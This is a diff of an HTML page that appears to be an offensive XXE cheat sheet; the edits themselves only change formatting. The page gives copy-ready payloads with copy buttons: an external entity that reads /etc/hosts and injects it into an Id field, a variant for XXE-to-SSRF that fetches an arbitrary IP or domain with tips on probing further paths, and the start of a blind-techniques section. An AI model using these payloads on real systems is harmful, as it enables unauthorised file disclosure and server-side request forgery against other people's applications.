@@ -49,12 +49,12 @@
 
 <b><u>SAMPLE:</u></b>
 
-&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+<b>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE attempt [ &lt;!ENTITY CUMBIA SYSTEM "file:///etc/hosts"&gt; ]&gt;
 &lt;Check&gt;
 &lt;Id&gt;&CUMBIA;&lt;/Id&gt;
 &lt;productId&gt;1&lt;/productId&gt;
-&lt;/Check&gt;
+&lt;/Check&gt;</b>
 
 <b>GET DATA: </b><mark id="XXE01">&lt;!DOCTYPE attempt [ &lt;!ENTITY VAR_NAME SYSTEM "file:///etc/hosts"&gt; ]&gt; </mark>
 
@@ -66,31 +66,31 @@
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#XXE02')">.C2.</button>
 	
-<b>NOTE:</b> The name "CUMBIA" is the entity/variable name used to call <u>/etc/hosts</u> externally, it is invoked into the XML file and invoke it using 
-one input field. !!!! Special section to put the XML code, <u>between initial tag and function.</u> CHECK SAMPLE!
+<b>NOTE:</b> The name "CUMBIA" is the entity/variable name used to call <u>/etc/hosts</u> externally, it is invoked into the XML file and invoke 
+it using one input field. !!!! Special section to put the XML code, <u>between initial tag and function.</u> CHECK SAMPLE!
 Modify the name as you want.  
 	
 </details>
 <details>
-<summary> CROSS ATTACKS </summary>
+<summary>CROSS ATTACKS</summary>
 
 <b> > XXE to SSRF</b>
 
-There's one simple attempt that can be executed, for this case scenario a vuln_server will be needed to exploit this. This attack can be considered
-"external entities" attack. Same payload and technique can be used to exploit this. 
+There's one simple attempt that can be executed, for this case scenario a vuln_server will be needed to exploit this. This attack can 
+be considered "external entities" attack. Same payload and technique can be used to exploit this. 
 
 <b>GET DATA: </b><mark id="XXE10">&lt;!DOCTYPE attempt [ &lt;!ENTITY VAR_NAME SYSTEM "http://IP/DOMAIN"&gt; ]&gt;</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#XXE10')">.C1.</button>
 
-Sometimes each time you find and call a URL path, probably the application will be printing the current/next path in action. Try to see if others
-paths provide more information.
+Sometimes each time you find and call a URL path, probably the application will be printing the current/next path in action. Try to 
+see if others paths provide more information.
 	
 </details>
 <details>
-<summary> BLIND TECHNIQUES </summary>
+<summary>BLIND TECHNIQUES</summary>
 
-<b> >> VIA ERROR MESSAGES </b>
+<b> > VIA ERROR MESSAGES </b>
 
 
 	
